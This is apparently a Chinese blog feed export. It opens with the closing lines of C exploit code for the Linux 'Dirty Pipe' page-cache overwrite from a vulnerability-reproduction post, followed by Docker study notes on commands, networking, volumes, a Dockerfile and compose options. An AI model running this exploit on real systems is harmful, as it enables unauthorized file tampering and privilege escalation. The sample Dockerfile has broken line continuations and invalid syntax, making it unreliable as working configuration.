nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker学习笔记</title>
    <link href="/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="docker学习笔记"><a href="#docker学习笔记" class="headerlink" title="docker学习笔记"></a>docker学习笔记</h1><h2 id="1-什么是docker"><a href="#1-什么是docker" class="headerlink" title="1.什么是docker?"></a>1.什么是docker?</h2><p>1.docker是一种基于容器的虚拟化技术,可以让开发者将开发的软件以及依赖打包成一个镜像然后发布到任何流行的linux或windows服务器上面</p><h2 id="2-为什么要用docker"><a href="#2-为什么要用docker" class="headerlink" title="2.为什么要用docker?"></a>2.为什么要用docker?</h2><p>作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。</p><ul><li>更高效的系统利用资源</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>更快速的启动时间</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>一致的运行环境</li></ul><p>开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 「这段代码在我机器上没问题啊」 这类问题。</p><ul><li>持续交付和部署</li></ul><p>对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。<br>使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery&#x2F;Deployment) 系统进行自动部署。<br>而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像</p><ul><li>更轻松的迁移</li></ul><p>由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p><ul><li>更轻松的维护和扩展</li></ul><p>Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的 官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。</p><h2 id="3-docker架构"><a href="#3-docker架构" class="headerlink" title="3.docker架构"></a>3.docker架构</h2><h4 id="3-1-docker三个概念"><a href="#3-1-docker三个概念" class="headerlink" title="3.1.docker三个概念"></a>3.1.docker三个概念</h4><ul><li><p>容器</p><p>容器时镜像的运行实例,容器可以启动,停止,删除。</p></li><li><p>镜像</p><p>创建docker容器的模板,相当于一个根文件系统,在docker运行的时候,docker会将镜像挂载</p></li><li><p>仓库</p><p>存储docker镜像的仓库</p><p>docker实现结构</p><p><img src="/images/docker-on-linux.png" alt="&quot;docker&quot;"></p></li></ul><h2 id="4-docker体系结构"><a href="#4-docker体系结构" class="headerlink" title="4.docker体系结构"></a>4.docker体系结构</h2><p>docker采用C&#x2F;S结构,docker daemon作为server接收client的请求,client和server可以运行在同一台机器上,也可以使用socket通信的方式运行在不同的机器上面</p><ul><li>docker守护进程(docker deamon)</li></ul><p>docker在后台运行的服务端程序,等待docker client的请求</p><ul><li><p>docker客户端(docker client)</p><p>是用户与Docker交互方式。它接受用户指令并且与背后的Docker守护进程通信。</p></li></ul><h2 id="5-docker安装"><a href="#5-docker安装" class="headerlink" title="5.docker安装"></a>5.docker安装</h2><p>1.脚本安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://get.docker.com -o get-docker.sh<br>./get-docker.sh<br></code></pre></td></tr></table></figure><p>2.包管理器安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S docker<br></code></pre></td></tr></table></figure><p>3.docker换源</p><p>编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://ghcr.io&quot;</span>,<br>    <span class="hljs-string">&quot;https://mirror.baidubce.com&quot;</span><br>  ]<br>&#125;<br><span class="hljs-comment">#换源后需要重启docker才能生效</span><br>systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="6-docker使用"><a href="#6-docker使用" class="headerlink" title="6.docker使用"></a>6.docker使用</h2><h3 id="6-1-docker的基本使用"><a href="#6-1-docker的基本使用" class="headerlink" title="6.1.docker的基本使用"></a>6.1.docker的基本使用</h3><p>1.获取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull helloworld<br></code></pre></td></tr></table></figure><p>2.创建并运行容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it image:tag <span class="hljs-built_in">command</span><br><span class="hljs-comment">#-i(interactive)以交互方式启动docker容器</span><br><span class="hljs-comment">#-t(tty)分配一个tty</span><br><span class="hljs-comment">#--hostname 指定容器内的主机名</span><br><span class="hljs-comment">#--name 指定容器的名称</span><br><span class="hljs-comment">#--privileged 赋予容器root权限</span><br><span class="hljs-comment">#-p 指定端口映射</span><br><span class="hljs-comment">#-v 映射容器卷</span><br><span class="hljs-comment">#command 指需要执行的命令</span><br>注意:正在运行的docker容器一定要有一个前台进程,否则该docker会认为没有正在运行的进程,即退出该容器<br></code></pre></td></tr></table></figure><p>3.启动或停止docker容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看所有的容器</span><br>docker ps -a<br><span class="hljs-comment">#启动一个docker容器</span><br>docker start $(container_id)<br>docker stop $(container_id)<br></code></pre></td></tr></table></figure><p>4.其他常用的docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it /bin/bash<br><span class="hljs-comment">#在容器内重新开启一个shell,并且进入到该shell</span><br>docker attach container_id<br><span class="hljs-comment">#进入到指定容器id内正在运行的终端</span><br>docker top container_id<br><span class="hljs-comment">#查看某容器内的进程情况</span><br>docker logs container_id<br><span class="hljs-comment">#查看某容器的日志</span><br>docker inspect container_id<br><span class="hljs-comment">#查看某容器的配置以及详细信息</span><br>docker commit -a <span class="hljs-string">&quot;&quot;</span> -m <span class="hljs-string">&quot;&quot;</span> container_id image:tag<br><span class="hljs-comment">#将某一个容器打包成镜像</span><br>docker <span class="hljs-built_in">export</span> container_id &gt; ubuntu.tar<br><span class="hljs-comment">#导出一个docker容器(不包含映射的容器卷以及映射路径)</span><br><span class="hljs-built_in">cat</span> docker/ubuntu.tar | docker import - <span class="hljs-built_in">test</span>/ubuntu:v1<br><span class="hljs-comment">#将一个tar包导入成docker镜像</span><br>docker <span class="hljs-built_in">rm</span> container_id<br><span class="hljs-comment">#删除一个docker容器</span><br></code></pre></td></tr></table></figure><h3 id="6-2-docker网络"><a href="#6-2-docker网络" class="headerlink" title="6.2.docker网络"></a>6.2.docker网络</h3><p>docker一共有5中网络模式</p><ul><li><p>bridge</p><p>docker的默认网络模式,创建一块虚拟网卡连接上物理网卡,所有的docker将库创建一对虚拟接口,veth&amp;eth0一个在容器内，一个在网桥上,网桥提供路由功能,(可以想象为虚拟机内的nat模式)</p></li><li><p>macvlan</p><p>创建一个虚拟网卡,直接连接至物理网卡,该网络模式下容器分配的ip地址和物理机在同一个网段(相当于虚拟机内的桥接模式)</p></li><li><p>host</p><p>与宿主机共享网卡</p></li><li><p>container</p><p>和已经存在的容器共享一块网卡</p></li><li><p>none</p><p>不创建网络,无法联网</p></li></ul><h5 id="docker网络的创建"><a href="#docker网络的创建" class="headerlink" title="docker网络的创建"></a>docker网络的创建</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个桥接的docker网络</span><br>docker network creat -d bridge --subnet=172.20.0.1/24 --gateway=172.20.0.1 -o parent=eth0 mybridge<br></code></pre></td></tr></table></figure><h2 id="6-3-docker数据卷"><a href="#6-3-docker数据卷" class="headerlink" title="6.3.docker数据卷"></a>6.3.docker数据卷</h2><p>  因为docker容器中的数据在docker容器删除后会全部消失,因此可以借助docker容器数据卷来实现docker容i数据的本地持久化.docker容器数据卷永久有效,除非手动删除,并且docker数据卷可以让多个docker容器共享数据</p><h5 id="数据卷的创建"><a href="#数据卷的创建" class="headerlink" title="数据卷的创建"></a>数据卷的创建</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker volume create volume_name<br></code></pre></td></tr></table></figure><h5 id="数据卷的挂载"><a href="#数据卷的挂载" class="headerlink" title="数据卷的挂载"></a>数据卷的挂载</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v volume_name:container_path image_name<br></code></pre></td></tr></table></figure><h2 id="7-Dockerfile"><a href="#7-Dockerfile" class="headerlink" title="7.Dockerfile"></a>7.Dockerfile</h2><h5 id="什么是Dockerfile"><a href="#什么是Dockerfile" class="headerlink" title="什么是Dockerfile?"></a>什么是Dockerfile?</h5><p>  dockerfile是一个用于构建docker镜像的脚本,docker可以读取dockerfile文件自动构建docker镜像</p><h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用?"></a>如何使用?</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#当dockerfile命名为Dockerfile并且当前在dockerfile路径下</span><br>docker build -t name:tag .<br><span class="hljs-comment">#指定dockerfile文件路径</span><br>docker build -f /path/to/dockerfile -t name:tag<br></code></pre></td></tr></table></figure><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5>  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<br><span class="hljs-keyword">MAINTAINER</span> bugprogram-git<br><span class="hljs-keyword">ENV</span> TZ=Asia/Shanghai<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list \ </span><br>&amp;&amp; apt-get update \<br>&amp;&amp; ln -snf /usr/share/zoneinfo/$TZ /etc/localtime <br>&amp;&amp; echo $TZ &gt; /etc/timezone \<br>apt-get install -y tzdata unzip wget npm curl \<br>&amp;&amp; apt-get clean \<br>&amp;&amp; apt-get autoclean \<br>&amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /minecraft \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">mkdir</span> /minecraft/dashboard \</span><br><span class="language-bash">&amp;&amp; wget https://github.com/Suwings/MCSManager/archive/refs/tags/v8.6.23.zip \</span><br><span class="language-bash">&amp;&amp; unzip v8.6.23.zip -d /minecraft/dashboard </span><br><span class="hljs-comment">#同样的后面的文件名以及解压的目录名要根据实际情况进行修改</span><br>&amp;&amp; mv /minecraft/dashboard/MCSManager-<span class="hljs-number">8.6</span>.<span class="hljs-number">23</span>/* /minecraft/dashboard <br>&amp;&amp; rm -rf /minecraft/dashboard/MCSManager-<span class="hljs-number">8.6</span>.<span class="hljs-number">23</span> \<br>&amp;&amp; apt purge  -y unzip wget \<br>&amp;&amp; apt autoremove -y \<br>&amp;&amp; rm /v8.<span class="hljs-number">6.23</span>.zip \<br>&amp;&amp; cd /minecraft/dashboard &amp;&amp; npm install<br><span class="hljs-keyword">EXPOSE</span> [<span class="hljs-number">19132</span>,<span class="hljs-number">23333</span>]<br><span class="hljs-comment">#对外暴露的端口</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /minecraft/dashboard/ &amp;&amp; npm start</span><br></code></pre></td></tr></table></figure><h2 id="8-docker-compose"><a href="#8-docker-compose" class="headerlink" title="8.docker-compose"></a>8.docker-compose</h2><h5 id="什么是docker-compose"><a href="#什么是docker-compose" class="headerlink" title="什么是docker-compose?"></a>什么是docker-compose?</h5><p>  docker-compose是一个用python写的容器编排工具,在连续部署多个容器的时候,可以使用一个docker-compose脚本实现一次部署多个容器,大大提高了容器编排效率</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.0&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>  <span class="hljs-comment">#容器名称</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span><br>    <span class="hljs-comment">#指定构建的上下文路径</span><br>    <span class="hljs-attr">image:</span><br>    <span class="hljs-comment">#指定镜像的名称</span><br>      <span class="hljs-string">nginx:alpine</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-comment">#指定映射的端口</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;5000:5000&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>    <span class="hljs-comment">#指定挂载的容器卷</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">volumes:/code</span><br>    <span class="hljs-attr">links:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attr">redis:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:latest</span><br><span class="hljs-attr">volumes:</span><br>  <span class="hljs-string">redis:&#123;&#125;</span><br><span class="hljs-comment">#定义网络</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">external:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">my-pre-existing-network</span><br>      <span class="hljs-comment">#这里不能使用默认的docker0网络,只能使用用户自定义的网络</span><br></code></pre></td></tr></table></figure><p>  docker-compose常用的一些属性如下:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><code class="hljs bash">Compose和Docker兼容性：<br>    Compose 文件格式有3个版本,分别为1, 2.x 和 3.x<br>    目前主流的为 3.x 其支持 docker 1.13.0 及其以上的版本<br><br>常用参数：<br>    version           <span class="hljs-comment"># 指定 compose 文件的版本</span><br>    services          <span class="hljs-comment"># 定义所有的 service 信息, services 下面的第一级别的 key 既是一个 service 的名称</span><br><br>        build                 <span class="hljs-comment"># 指定包含构建上下文的路径, 或作为一个对象，该对象具有 context 和指定的 dockerfile 文件以及 args 参数值</span><br>            context               <span class="hljs-comment"># context: 指定 Dockerfile 文件所在的路径</span><br>            dockerfile            <span class="hljs-comment"># dockerfile: 指定 context 指定的目录下面的 Dockerfile 的名称(默认为 Dockerfile)</span><br>            args                  <span class="hljs-comment"># args: Dockerfile 在 build 过程中需要的参数 (等同于 docker container build --build-arg 的作用)</span><br>            cache_from            <span class="hljs-comment"># v3.2中新增的参数, 指定缓存的镜像列表 (等同于 docker container build --cache_from 的作用)</span><br>            labels                <span class="hljs-comment"># v3.3中新增的参数, 设置镜像的元数据 (等同于 docker container build --labels 的作用)</span><br>            shm_size              <span class="hljs-comment"># v3.5中新增的参数, 设置容器 /dev/shm 分区的大小 (等同于 docker container build --shm-size 的作用)</span><br><br>        <span class="hljs-built_in">command</span>               <span class="hljs-comment"># 覆盖容器启动后默认执行的命令, 支持 shell 格式和 [] 格式</span><br><br>        configs               <span class="hljs-comment"># 不知道怎么用</span><br><br>        cgroup_parent         <span class="hljs-comment"># 不知道怎么用</span><br><br>        container_name        <span class="hljs-comment"># 指定容器的名称 (等同于 docker run --name 的作用)</span><br><br>        credential_spec       <span class="hljs-comment"># 不知道怎么用</span><br><br>        deploy                <span class="hljs-comment"># v3 版本以上, 指定与部署和运行服务相关的配置, deploy 部分是 docker stack 使用的, docker stack 依赖 docker swarm</span><br>            endpoint_mode         <span class="hljs-comment"># v3.3 版本中新增的功能, 指定服务暴露的方式</span><br>                vip                   <span class="hljs-comment"># Docker 为该服务分配了一个虚拟 IP(VIP), 作为客户端的访问服务的地址</span><br>                dnsrr                 <span class="hljs-comment"># DNS轮询, Docker 为该服务设置 DNS 条目, 使得服务名称的 DNS 查询返回一个 IP 地址列表, 客户端直接访问其中的一个地址</span><br>            labels                <span class="hljs-comment"># 指定服务的标签，这些标签仅在服务上设置</span><br>            mode                  <span class="hljs-comment"># 指定 deploy 的模式</span><br>                global                <span class="hljs-comment"># 每个集群节点都只有一个容器</span><br>                replicated            <span class="hljs-comment"># 用户可以指定集群中容器的数量(默认)</span><br>            placement             <span class="hljs-comment"># 不知道怎么用</span><br>            replicas              <span class="hljs-comment"># deploy 的 mode 为 replicated 时, 指定容器副本的数量</span><br>            resources             <span class="hljs-comment"># 资源限制</span><br>                limits                <span class="hljs-comment"># 设置容器的资源限制</span><br>                    cpus: <span class="hljs-string">&quot;0.5&quot;</span>           <span class="hljs-comment"># 设置该容器最多只能使用 50% 的 CPU </span><br>                    memory: 50M           <span class="hljs-comment"># 设置该容器最多只能使用 50M 的内存空间 </span><br>                reservations          <span class="hljs-comment"># 设置为容器预留的系统资源(随时可用)</span><br>                    cpus: <span class="hljs-string">&quot;0.2&quot;</span>           <span class="hljs-comment"># 为该容器保留 20% 的 CPU</span><br>                    memory: 20M           <span class="hljs-comment"># 为该容器保留 20M 的内存空间</span><br>            restart_policy        <span class="hljs-comment"># 定义容器重启策略, 用于代替 restart 参数</span><br>                condition             <span class="hljs-comment"># 